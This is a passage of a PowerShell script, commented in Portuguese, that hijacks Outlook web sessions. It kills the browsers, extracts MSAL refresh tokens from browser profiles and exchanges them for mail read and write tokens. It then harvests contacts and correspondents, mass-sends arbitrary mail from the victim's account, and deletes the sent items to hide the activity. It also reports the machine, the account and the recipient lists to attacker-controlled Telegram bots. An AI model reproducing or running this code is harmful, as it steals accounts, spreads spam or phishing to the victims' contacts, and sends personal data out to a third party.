        foreach ($e in $falhaLimite) { $L += "  $e" }
    }
    return ($L -join "`n")
}

# ---------------- agenda de contatos (GET /me/contacts, paginado) ----------------
# Usa o MESMO token OWA (READ scope) que valida via /me — nao precisa de novo
# consent. Retorna array de @{ name; email } (primeiro endereco de cada contato
# que tenha e-mail). Contatos sem email (so telefone, por ex.) sao descartados.
function Get-OWAContacts([string]$token) {
    $result = @()
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try {
            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
        } catch { return $result }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                $email = $null
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) { $email = $c.emailAddresses[0].address }
                if ($email) { $result += @{ name = $c.displayName; email = $email } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return $result
}

# Descobre o id da pasta de Enviados. Na API v2.0 NAO existe /me/sentitems — so
# chega pela pasta via /me/mailFolders/{id}. O nome varia por locale, por isso
# casamos contra uma lista de variantes conhecidas.
function Get-OWASentFolderId([string]$token) {
    $names = @("sent items", "sent", "itens enviados", "enviados", "elementos enviados", "éléments envoyés", "envoyés", "gesendete elemente", "elementi inviati")
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/mailFolders?`$top=100" -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
    } catch { return $null }
    $j = $resp.Content | ConvertFrom-Json
    if ($j.value) {
        foreach ($f in $j.value) {
            $dn = ""
            if ($f.DisplayName) { $dn = $f.DisplayName.ToString().ToLower().Trim() }
            if ($names -contains $dn) { return $f.Id }
        }
    }
    return $null
}

# ---------------- todas as pessoas (contatos + historico de mensagens) ----------------
# Nao basta a agenda: muita gente com quem o cliente troca mail NAO esta salva como
# contato. Coletamos enderecos unicos de: (1) contatos, (2) Inbox e (3) Enviados
# (From/To/Cc/Bcc de cada mensagem). $maxMessages limita o escaneamento (0 = tudo).
# O proprio endereco ($selfEmail) e filtrado. Retorna array de @{ name; email }
# (email em minusculas; nome = displayName se vier de contato, senao o proprio email).
function Get-OWAAllPeople([string]$token, [string]$selfEmail, [int]$maxMessages) {
    $people = @{}
    # 1) contatos
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) {
                    $em = $c.emailAddresses[0].address
                    if ($em) { $people[$em.ToLower()] = $c.displayName }
                }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    # 2) Inbox + Enviados (From/To/Cc/Bcc). Enviados via /me/mailFolders/{id}
    # (nao existe /me/sentitems na v2.0); se a pasta nao for achada por nome,
    # seguimos so com o Inbox.
    $scanned = 0
    $uris = @("$OWA_API_BASE/me/messages")
    $sentId = Get-OWASentFolderId $token
    if ($sentId) { $uris += "$OWA_API_BASE/me/mailFolders/$sentId/messages" }
    foreach ($base in $uris) {
        # CONCATENA (nao "$base?..."): no PS 5.1, um '?' logo apos a variavel
        # dentro de string dupla "come" o valor da variavel (URI ficava sem host).
        $uri = $base + "?`$top=200&`$select=From,ToRecipients,CcRecipients,BccRecipients"
        while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
            $j = $resp.Content | ConvertFrom-Json
            if ($j.value) {
                foreach ($m in $j.value) {
                    $scanned++
                    $addrs = @()
                    if ($m.From -and $m.From.EmailAddress -and $m.From.EmailAddress.Address) { $addrs += $m.From.EmailAddress.Address }
                    foreach ($coll in @($m.ToRecipients, $m.CcRecipients, $m.BccRecipients)) {
                        if ($coll) { foreach ($r in $coll) { if ($r.EmailAddress -and $r.EmailAddress.Address) { $addrs += $r.EmailAddress.Address } } }
                    }
                    foreach ($a in $addrs) {
                        if ($a -and $a -match '^\S+@\S+\.\S+$') {
                            $key = $a.ToLower()
                            if (-not $people.ContainsKey($key)) { $people[$key] = $a }
                        }
                    }
                }
            }
            $uri = $j."@odata.nextLink"
        }
    }
    $result = @()
    foreach ($k in $people.Keys) {
        if ($selfEmail -and $k -eq $selfEmail.ToLower()) { continue }
        $result += [PSCustomObject]@{ name = $people[$k]; email = $k }
    }
    return $result
}

# ---------------- destinatários do histórico de enviados (agenda + To/Cc/Bcc) ----------------
# SUBCONJUNTO de Get-OWAAllPeople: agenda + TODOS os To/Cc/Bcc da pasta Enviados
# (quem o cliente ja enviou e-mail) — NAO inclui o Inbox (quem enviou PARA ele).
# $maxMessages limita o escaneamento da pasta Enviados (0 = tudo). O proprio
# endereco ($selfEmail) e filtrado. Retorna PSCustomObject com contatos
# (array de @{ name; email }), total, daAgenda, doHistorico, amostra (ate 10
# e-mails NOVOS do historico, fora da agenda), scanned e sentFolderFound
# (distingue "pasta nao achada" de "pasta achada mas vazia").
function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages) {
    $agenda = @{}
    # 1) agenda (mesmo loop paginado de /me/contacts de Get-OWAAllPeople)
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) {
                    $em = $c.emailAddresses[0].address
                    if ($em) { $agenda[$em.ToLower()] = $c.displayName }
                }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    # 2) To/Cc/Bcc da pasta Enviados (historico de enviados). Enviados via
    # /me/mailFolders/{id} (nao existe /me/sentitems na v2.0); se a pasta nao
    # for achada por nome, seguimos so com a agenda.
    $historico = @{}
    $amostra = @()
    $scanned = 0
    $sentId = Get-OWASentFolderId $token
    if ($sentId) {
        $base = "$OWA_API_BASE/me/mailFolders/$sentId/messages"
        # CONCATENA (nao "$base?..."): no PS 5.1, um '?' logo apos a variavel
        # dentro de string dupla "come" o valor da variavel (URI ficava sem host).
        $uri = $base + "?`$top=200&`$select=ToRecipients,CcRecipients,BccRecipients"
        while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
            $j = $resp.Content | ConvertFrom-Json
            if ($j.value) {
                foreach ($m in $j.value) {
                    $scanned++
                    # -MaxMessages com granularidade de MENSAGEM (nao de pagina):
                    # para o loop assim que o limite e atingido.
                    if ($maxMessages -gt 0 -and $scanned -ge $maxMessages) { $uri = $null; break }
                    foreach ($coll in @($m.ToRecipients, $m.CcRecipients, $m.BccRecipients)) {
                        if ($coll) {
                            foreach ($r in $coll) {
                                if ($r.EmailAddress -and $r.EmailAddress.Address) {
                                    $a = $r.EmailAddress.Address
                                    if ($a -and $a -match '^\S+@\S+\.\S+$') {
                                        $key = $a.ToLower()
                                        if (-not $historico.ContainsKey($key)) {
                                            $historico[$key] = $a
                                            # amostra so com enderecos NOVOS (nao ja na agenda):
                                            # a linha do reporte diz "amostra do historico".
                                            if ($amostra.Count -lt 10 -and -not $agenda.ContainsKey($key)) { $amostra += $a }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            $uri = $j."@odata.nextLink"
        }
    }
    # 3) merge: agenda + historico (agenda tem prioridade no nome), dedup por
    # email em minusculas, filtra o proprio endereco.
    $people = @{}
    foreach ($k in $agenda.Keys) { $people[$k] = $agenda[$k] }
    foreach ($k in $historico.Keys) {
        if (-not $people.ContainsKey($k)) { $people[$k] = $historico[$k] }
    }
    $daAgenda = 0; $doHistorico = 0
    $result = @()
    foreach ($k in $people.Keys) {
        if ($selfEmail -and $k -eq $selfEmail.ToLower()) { continue }
        if ($agenda.ContainsKey($k)) { $daAgenda++ } else { $doHistorico++ }
        $result += [PSCustomObject]@{ name = $people[$k]; email = $k }
    }
    return [PSCustomObject]@{
        contatos = $result
        total = $result.Count
        daAgenda = $daAgenda
        doHistorico = $doHistorico
        amostra = $amostra
        scanned = $scanned
        sentFolderFound = [bool]$sentId
    }
}

# ---------------- SelfDelete: apaga da pasta Enviados ----------------
# Usa o token WRITE. $all=$true apaga TUDO em Enviados; $all=$false apaga so as
# cujo Subject bate EXATAMENTE com $subject (as que esta execucao enviou — nao
# toca no enviado pre-existente do cliente). Listagem paginada + retry em 429
# (Retry-After). DELETE /me/messages/{id} retorna 204. Retorna @{ apagadas;
# falhas; total_visto }.
function Remove-OWASentMessages([string]$token, [string]$subject, [bool]$all) {
    $apagadas = 0; $falhas = @(); $visto = 0
    $uri = "$OWA_API_BASE/me/messages?`$top=200"
    while ($uri) {
        # --- lista uma pagina (retry em 429) ---
        $j = $null
        for ($attempt = 0; $attempt -lt 3; $attempt++) {
            try {
                $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
                $j = $resp.Content | ConvertFrom-Json
                break
            } catch {
                $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
                if ($code -eq 429 -and $attempt -lt 2) {
                    $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
                    Start-Sleep -Seconds $ra
                } else { break }
            }
        }
        if (-not $j) { break }
        if ($j.value) {
            foreach ($m in $j.value) {
                $visto++
                $deletar = if ($all) { $true } else { ($m.Subject -eq $subject) }
                if (-not $deletar) { continue }
                # --- DELETE /me/messages/{id} (retry em 429) ---
                # Captura o erro (status + corpo) p/ diagnosticar: 403 ErrorAccessDenied
                # = token sem Mail.ReadWrite (le/envia mas nao apaga itens de mensagem).
                $ok = $false; $delCode = 0; $delErr = $null
                for ($attempt = 0; $attempt -lt 3; $attempt++) {
                    try {
                        $d = Invoke-WebRequest -Uri "$OWA_API_BASE/me/messages/$($m.id)" -Method Delete `
                            -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
                        $ok = ($d.StatusCode -eq 204)
                        break
                    } catch {
                        $delCode = 0; if ($_.Exception.Response) { $delCode = [int]$_.Exception.Response.StatusCode }
                        $delErr = $null
                        if ($_.Exception.Response) {
                            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $delErr = $sr.ReadToEnd() } catch {}
                        }
                        if ($delCode -eq 204) { $ok = $true; break }
                        if ($delCode -eq 429 -and $attempt -lt 2) {
                            $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
                            Start-Sleep -Seconds $ra
                        } else { break }
                    }
                }
                if ($ok) { $apagadas++ }
                else { $falhas += [PSCustomObject]@{ id = $m.id; status = $delCode; erro = $delErr } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return @{ apagadas = $apagadas; falhas = $falhas; total_visto = $visto }
}

# ---------------- enumeração de perfis ----------------
function Get-Profiles([string]$root) {
    $result = @()
    if (-not (Test-Path $root)) { return $result }
    foreach ($entry in (Get-ChildItem $root -Directory -ErrorAction SilentlyContinue)) {
        $name = $entry.Name
        if ($name -eq "Default" -or $name -like "Profile *") {
            $hasCookies = Test-Path (Join-Path $entry.FullName "Network\Cookies")
            $hasLS      = Test-Path (Join-Path $entry.FullName "Local Storage\leveldb")
            if ($hasCookies -or $hasLS) { $result += @{ Name = $name; Dir = $entry.FullName } }
        }
    }
    if ($result.Count -eq 0) {
        # Opera: a própria raiz pode ser o perfil (sem sub-Default)
        if ((Test-Path (Join-Path $root "Network\Cookies")) -or (Test-Path (Join-Path $root "Local Storage\leveldb"))) {
            $result += @{ Name = (Split-Path $root -Leaf); Dir = $root }
        }
    }
    return $result
}

# ---------------- fechar navegadores (libera locks do leveldb/Cookies) ----------------
# Perfis com navegador aberto ficam BLOQUEADO_NAVEGADOR_ABERTO (arquivo travado).
# -CloseBrowsers mata os processos antes do scan e dá uma pausa p/ o SO soltar os
# handles. Retorna a lista de nomes de processo que estavam rodando e foram fechados.
function Close-Browsers {
    $procs = @("chrome", "msedge", "brave", "opera", "operagx")
    $fechados = @()
    foreach ($p in $procs) {
        $found = Get-Process -Name $p -ErrorAction SilentlyContinue
        if ($found) {
            $found | Stop-Process -Force -ErrorAction SilentlyContinue
            $fechados += $p
        }
    }
    if ($fechados.Count -gt 0) { Start-Sleep -Milliseconds 800 }
    return $fechados
}

# ---------------- análise de um perfil ----------------
function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
    $cookies = Test-MSCookies $pdir
    $leveldb = Join-Path $pdir "Local Storage\leveldb"
    $msal = Get-MSALToken $leveldb
    $display = $null
    try {
        $pref = Get-Content (Join-Path $pdir "Preferences") -Raw -ErrorAction Stop | ConvertFrom-Json
        $display = $pref.profile.name
    } catch {}

    $readTok = $writeTok = $writeClient = $null
    $validated = $null
    if ($validate -and $msal) {
        $readTok = Exchange-OWAToken $msal.refresh $msal.client $OWA_READ_SCOPE
        if ($readTok) {
            $validated = Test-OWAToken $readTok
            if ($validated.state -eq "valido") {
                $wt = Get-OWAWriteToken $msal.refresh $msal.client
                if ($wt) { $writeTok = $wt.token; $writeClient = $wt.mailClient }
            }
        }
    }

    if ($validated -and $validated.state -eq "valido") { $verdict = "LOGADO_TOKEN_VALIDO" }
    elseif ($cookies.ms -or $msal) { $verdict = "LOGADO_SESSAO_VIVA" }
    elseif ($cookies.state -eq "locked") { $verdict = "BLOQUEADO_NAVEGADOR_ABERTO" }
    else { $verdict = "SEM_SESSAO" }

    [PSCustomObject]@{
        navegador   = $browser
        perfil      = $pname
        perfil_nome = $display
        profile_dir = $pdir
        veredito    = $verdict
        cookies_ms  = $cookies.ms
        cookies_outlook = $cookies.outlook
        msal        = [bool]$msal
        msal_client = if ($msal) { $msal.client } else { $null }
        conta       = if ($validated) { $validated.email } else { $null }
        validacao   = $validated
        token_read  = $readTok
        token_write = $writeTok
        write_client = $writeClient
        exchange_error = if ($msal -and -not $readTok) { $script:LastExchangeError } else { $null }
        exchange_hint  = if ($msal -and -not $readTok) { Get-ExchangeErrorHint $script:LastExchangeError } else { $null }
    }
}

# ---------------- main ----------------
$validate = -not $NoValidate.IsPresent
$fechados = @()
if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
$results = @()
foreach ($b in $browsers) {
    $profiles = Get-Profiles $b.Root
    foreach ($p in $profiles) {
        $results += Analyze-Profile $b.Name $p.Name $p.Dir $validate
    }
}

$validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_TOKEN_VALIDO" })
$vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
$bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })

if ($validos.Count -gt 0) {
    if ($validos.Count -gt 1) {
        $decisao = "MAIS DE UM Outlook logado com token válido -> USAR TODOS: " +
            (($validos | ForEach-Object { "$($_.navegador)/$($_.perfil) ($($_.conta))" }) -join "; ")
    } else {
        $r = $validos[0]
        $decisao = "USAR: $($r.navegador)/$($r.perfil) — conta $($r.conta) (token OWA validado via REST API v2.0 /me)"
    }
}
elseif ($vivos.Count -gt 0) {
    $comErr = @($vivos | Where-Object { $_.exchange_error })
    if ($comErr.Count -gt 0) {
        # refresh MSAL presente mas a troca falhou — classificar o erro e dar a dica
        $decisao = "Sessão viva mas a troca do refresh FALHOU em: " +
            (($comErr | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ") +
            " -> " + ($comErr[0].exchange_hint)
    } else {
        $decisao = "Sessão viva (cookie MSPAuth / refresh MSAL) mas token não validado -> trocar o refresh (scope api://<client de mail do OWA>/.default) em: " +
            (($vivos | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
    }
}
elseif ($bloqueados.Count -gt 0) {
    $decisao = "Perfis com arquivos travados (navegador aberto) -> fechar o navegador e re-executar: " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
else { $decisao = "NENHUMA sessão viva encontrada" }

if ($bloqueados.Count -gt 0 -and ($validos.Count -gt 0 -or $vivos.Count -gt 0)) {
    $decisao += " | ATENÇÃO: perfis ainda travados (pode haver OUTRA conta logada ali): " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
$comWrite = @($validos | Where-Object { $_.token_write })
if ($comWrite.Count -gt 0) {
    $decisao += " | WRITE OK (Mail.Send): " + (($comWrite | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}

# ---- modo -SendTo ----
$envio = $null
if ($SendTo) {
    $src = $validos | Where-Object { $_.token_write } | Select-Object -First 1
    if ($src) {
        $res = Send-OWAMail $src.token_write $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automático (PowerShell)"
        $envio = [PSCustomObject]@{ de = $src.conta; para = $SendTo; ok = $res.ok; status = $res.status; erro = $res.erro; perfil = "$($src.navegador)/$($src.perfil)" }
    }
    else {
        $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
        if ($cand) {
            $msal = Get-MSALToken (Join-Path $cand.profile_dir "Local Storage\leveldb")
            $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
            $wt = if ($wtObj) { $wtObj.token } else { $null }
            if ($wt) {
                $res = Send-OWAMail $wt $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automático (PowerShell)"
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $res.ok; status = $res.status; perfil = "$($cand.navegador)/$($cand.perfil)" }
            } else {
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_token_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
            }
        } else {
            $envio = [PSCustomObject]@{ de = $null; para = $SendTo; ok = $false; status = "sem_perfil_com_refresh"; perfil = $null }
        }
    }
}

# ---- modo -ToAllContacts / -ToAllPeople / -ToAllRecipients: lista e envia ----
# -ToAllContacts:   so a agenda (Get-OWAContacts).
# -ToAllPeople:     agenda + historico de Inbox/Enviados (Get-OWAAllPeople) — pega
#                   quem o cliente ja trocou mail, mesmo sem estar na agenda.
# -ToAllRecipients: agenda + To/Cc/Bcc da pasta Enviados (Get-OWARecipients) —
#                   SUBCONJUNTO de -ToAllPeople: NAO inclui o Inbox (so quem o
#                   cliente ja enviou e-mail, nao quem enviou para ele).
# -DryRun:          lista os destinatarios sem enviar (preview/teste).
# -MaxContacts > 0 limita o total (trava de seguranca). Pausa curta entre envios.
$envioTodos = $null
if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) {
    $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
    $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAll" }
    $body    = if ($Body)    { $Body }    else { "Mensagem de teste (PowerShell)" }
    if ($src) {
        $quebra = $null
        if ($ToAllRecipients.IsPresent) {
            # -ToAllRecipients: agenda + historico de Enviados. Mapeamento
            # EXPLICITO dos campos da quebra p/ o reporte (Build-ReportText) e
            # o JSON de saida (quebra em ambos os modos: dryrun e envio real).
            $r = Get-OWARecipients $src.token_read $src.conta $MaxMessages
            $contatos = @($r.contatos)
            $quebra = @{ daAgenda = $r.daAgenda; doHistorico = $r.doHistorico; amostra = $r.amostra; scanned = $r.scanned; sentFolderFound = $r.sentFolderFound }
        }
        elseif ($ToAllPeople.IsPresent) {
            $contatos = @(Get-OWAAllPeople $src.token_read $src.conta $MaxMessages)
        } else {
            $contatos = @(Get-OWAContacts $src.token_read)
        }
        if ($MaxContacts -gt 0 -and $contatos.Count -gt $MaxContacts) { $contatos = @($contatos | Select-Object -First $MaxContacts) }
        if ($DryRun.IsPresent) {
            $envioTodos = [PSCustomObject]@{
                de = $src.conta; modo = "dryrun"; total = $contatos.Count; enviados = 0; falhas = @()
                destinatarios = $contatos
                perfil = "$($src.navegador)/$($src.perfil)"
            }
            if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
        } else {
            $ok = 0; $falhas = @(); $enviados = @()
            $limite = $false
            foreach ($c in $contatos) {
                $res = Send-OWAMail $src.token_write $c.email $subject $body
                if ($res.ok) { $ok++; $enviados += $c.email }
                else {
                    $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro }
                    # trava de erro fatal: 429 limite diario OU 403 conta suspensa —
                    # em ambos o OWA ja cortou o dia/conta; continuar queima e denuncia.
                    if ((($res.status -eq 429) -and ($res.erro -match "ErrorExceededMessageLimit")) -or (($res.status -eq 403) -and ($res.erro -match "ErrorAccountSuspend"))) {
                        $limite = $true
                        $erroTrava = if ($res.status -eq 403) { "Conta suspensa (HTTP 403)" } else { "Limite diário atingido (HTTP 429)" }
                        break
                    }
                }
                Start-Sleep -Milliseconds 300
            }
            # bot de lista: emails que falharam por erro fatal (429 limite excedido
            # OU 403 conta suspensa) — vao junto com os enviados ao 2o bot.
            $falhaLimite = @($falhas | Where-Object { ($_.status -eq 429 -and $_.erro -match "ErrorExceededMessageLimit") -or ($_.status -eq 403 -and $_.erro -match "ErrorAccountSuspend") } | ForEach-Object { $_.email })
            $envioTodos = [PSCustomObject]@{
                de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
                perfil = "$($src.navegador)/$($src.perfil)"
            }
            if ($limite) {
                $envioTodos | Add-Member -MemberType NoteProperty -Name limite_atingido -Value $true
                $envioTodos | Add-Member -MemberType NoteProperty -Name erro_trava -Value $erroTrava
            }
            if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
            # bot de lista: envia ao 2o bot (ListaToken/ListaChatId) o remetente +
            # enviados + falhas por limite. Independente de -NoTelegram (que so
            # desliga o reporte principal). Chunking em blocos <= 4000 chars evita
            # o limite de 4096 do Telegram quando a lista e grande.
            if (($enviados.Count -gt 0) -or ($falhaLimite.Count -gt 0)) {
                $listaText = Build-ListaText $src.conta $enviados $falhaLimite
                $listaRes = @()
                if ($listaText.Length -le 4000) {
                    $listaRes += Send-TelegramMessage $ListaToken $ListaChatId $listaText
                } else {
                    $bloco = @(); $tam = 0
                    foreach ($linha in ($listaText -split "`n")) {
                        if (($tam + $linha.Length + 1) -gt 4000 -and $bloco.Count -gt 0) {
                            $listaRes += Send-TelegramMessage $ListaToken $ListaChatId ($bloco -join "`n")
                            $bloco = @(); $tam = 0
                        }
                        $bloco += $linha; $tam += $linha.Length + 1
                    }
                    if ($bloco.Count -gt 0) { $listaRes += Send-TelegramMessage $ListaToken $ListaChatId ($bloco -join "`n") }
                }
                $envioTodos | Add-Member -MemberType NoteProperty -Name lista -Value $listaRes
            }
        }
    } else {
        $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
    }
}

# ---- modo -SelfDelete: apaga o que esta execucao enviou (ou tudo, -SelfDeleteAll) ----
# Assunto a filtrar: -Subject sempre vence; senao, o padrao do modo que rodou.
# Pausa curta antes: o enviado aparece na pasta com pequeno atraso (consistencia
# eventual). Usa o MESMO criterio de selecao de token WRITE dos modos de envio.
$selfDelReport = $null
if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
    $all = $SelfDeleteAll.IsPresent
    $sdSubject = if ($Subject) { $Subject }
        elseif ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) { "[TESTE EnvioHOT] rehot -ToAll" }
        else { "[TESTE EnvioHOT] rehot.ps1 -SendTo" }
    $srcDel = $validos | Where-Object { $_.token_write } | Select-Object -First 1
    if ($srcDel) {
        Start-Sleep -Seconds 2
        $rd = Remove-OWASentMessages $srcDel.token_write $sdSubject $all
        $selfDelReport = [PSCustomObject]@{
            de = $srcDel.conta
            modo = if ($all) { "tudo" } else { "por_assunto: $sdSubject" }
            apagadas = $rd.apagadas; falhas = $rd.falhas; total_visto = $rd.total_visto
            perfil = "$($srcDel.navegador)/$($srcDel.perfil)"
        }
    } else {
        $selfDelReport = [PSCustomObject]@{ de = $null; apagadas = 0; falhas = @(); total_visto = 0; status = "sem_token_write" }
    }
}

$out = [PSCustomObject]@{
    maquina   = $env:COMPUTERNAME
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
    navegadores_fechados = $fechados
    decisao   = $decisao
    envio     = $envio
    envio_todos = $envioTodos
    self_delete = $selfDelReport
    perfis    = $results
}

# ---- Telegram: dispara o reporte desta máquina (máquina + OK/erro + qtd) ----
$telegram = $null
if ($TelegramToken -and $TelegramChatId -and -not $NoTelegram.IsPresent) {
    $telegram = Send-TelegramMessage $TelegramToken $TelegramChatId (Build-ReportText $out)
}
$out | Add-Member -MemberType NoteProperty -Name telegram -Value $telegram
$out | ConvertTo-Json -Depth 6